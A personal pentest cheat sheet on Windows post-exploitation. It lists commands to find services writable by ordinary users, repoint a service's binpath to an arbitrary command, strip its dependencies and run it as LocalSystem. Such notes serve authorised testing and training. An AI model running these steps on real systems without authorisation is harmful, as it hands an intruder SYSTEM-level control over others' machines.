---
tags: [PostEx]
title: PostEx/Vulnerable Windows Services
created: '2020-01-23T02:07:25.324Z'
modified: '2020-01-23T02:13:47.392Z'
---

# PostEx/Vulnerable Windows Services
## Find world writeable, elevated application paths
List all services
```
sc query state= all | findstr "SERVICE_NAME:"
```
Check the permissions of the directories using `cacls`
```
cacls <path-to-exe>
```

## Search for vulnerable, world writeable, privileged services
```
accesschk.exe -uwcqv "Authenticated Users" *
```
For Windows XP an older version must be uploaded with the `accepteula` flag
```
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
```
Once a service has been found change its executable path and run it
```
sc qc <vuln-service>
sc config <vuln-service> binpath= "<command>"
sc start <vuln-service>
```
Sometimes a dependency needs to be removed
```
sc config <vuln-service> depend= "" start= demand obj= ".\LocalSystem" password= ""
```
